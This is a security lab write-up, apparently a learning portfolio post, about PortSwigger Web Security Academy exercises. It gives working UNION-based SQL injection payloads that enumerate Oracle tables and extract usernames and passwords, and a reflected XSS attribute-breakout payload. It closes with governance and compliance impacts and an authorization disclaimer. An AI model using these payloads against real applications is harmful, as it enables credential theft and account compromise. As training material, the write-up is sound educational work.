📌 Overview

This lab demonstrates hands-on web application security testing conducted in a controlled learning environment. The objective was to identify, exploit, and analyze vulnerabilities from both a technical security and Governance, Risk & Compliance (GRC) perspective.

The assessment covered:

SQL Injection (Oracle Database Enumeration)

Credential Extraction via UNION-Based Injection

Reflected Cross-Site Scripting (XSS)

Traffic interception and manipulation using Burp Suite

🔍 Part 1: SQL Injection – Oracle Database Enumeration
🛠 Tools Used

Burp Suite Community Edition

Burp Embedded Browser

PortSwigger Web Security Academy Lab

Target Lab:
https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle

🚀 Step 1: Burp Suite Configuration

Started Burp Suite

Enabled Intercept ON

Launched Burp’s embedded browser

Navigated to the lab URL

🔎 Step 2: Determining Number of Columns

To identify the number of columns and text-compatible fields, the following UNION-based SQL injection payload was used:

'+UNION+SELECT+'abc','def'+FROM+dual--

✅ Outcome:

Confirmed the correct number of columns

Identified columns accepting text input

🗂 Step 3: Enumerating Database Tables

To retrieve table names from Oracle’s metadata:

'+UNION+SELECT+table_name,NULL+FROM+all_tables--

✅ Outcome:

Identified the credentials table:

USERS_JVMFOT

📑 Step 4: Retrieving Column Names

To enumerate columns within the identified table:

'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_JVMFOT'--

✅ Outcome:

Discovered sensitive credential columns:

USERNAME_CTGBWT

PASSWORD_RDWFG

🔐 Step 5: Extracting Credentials

To extract stored user credentials:

'+UNION+SELECT+USERNAME_CTGBWT,+PASSWORD_RDWFG+FROM+USERS_JVMFOT--

✅ Outcome:

Retrieved usernames and passwords

Successfully authenticated as Administrator

💥 Part 2: Cross-Site Scripting (XSS)
🎯 Objective

Identify and exploit a reflected XSS vulnerability within the application’s search functionality.

🔎 Step 1: Reflection Testing

Input entered into search field:

test123

Observation:

The input was reflected within an img src attribute.

🚨 Step 2: Breaking Out of Attribute Context

Injected payload:

"><svg onload=alert(1)>

✅ Outcome:

Successfully executed JavaScript

Confirmed presence of a reflected XSS vulnerability

🧠 Key Learning Outcomes

Oracle database enumeration using UNION-based SQL injection

Leveraging Oracle metadata tables (all_tables, all_tab_columns)

Credential extraction through vulnerable query logic

Attribute-context XSS payload crafting

Practical vulnerability testing using Burp Suite

Translating technical findings into governance and compliance risks

🏛 Governance & Compliance Impact

From a Governance, Risk & Compliance perspective, the identified vulnerabilities indicate:

Lack of input validation controls

Absence of parameterized queries

Insufficient output encoding

Weak application-layer security mechanisms

Potential Business Risks:

Data breaches

Regulatory non-compliance

Financial penalties

Reputational damage

⚠️ Disclaimer

This lab was conducted in a controlled environment provided by PortSwigger Web Security Academy strictly for educational and ethical security testing purposes.

These techniques must only be performed on systems where explicit authorization has been granted.


👩🏽‍💻 Author

Oluchi Blessing Uwakwe

🎯 Focus Area

Governance, Risk & Compliance (GRC) | Web Application Security | Vulnerability Assessment | SQL Injection Testing | Cross-Site Scripting (XSS)
